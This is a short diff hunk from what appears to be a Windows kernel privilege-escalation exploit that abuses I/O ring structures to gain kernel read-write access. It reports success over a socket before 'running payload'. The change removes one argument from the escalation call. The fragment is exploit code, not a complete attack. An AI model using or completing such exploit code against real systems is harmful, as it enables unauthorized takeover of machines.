@@ -508,7 +508,7 @@ int main(int argc, char** argv)
     do_write(ioring_addr + 0x9D);
 
     // Get kernel RW & elevate our process, then fix up SeMediumDaclSd
-    ioring_lpe2(GetCurrentProcessId(), 0x65007500, 0x1000, ioring_addr, g_kernel_base, build_rev);
+    ioring_lpe2(GetCurrentProcessId(), 0x65007500, 0x1000, ioring_addr, g_kernel_base);
     cur_msg = "Exploit succeeded! Running payload!\n\n";
     send(winSock, cur_msg, strlen(cur_msg), 0);
 
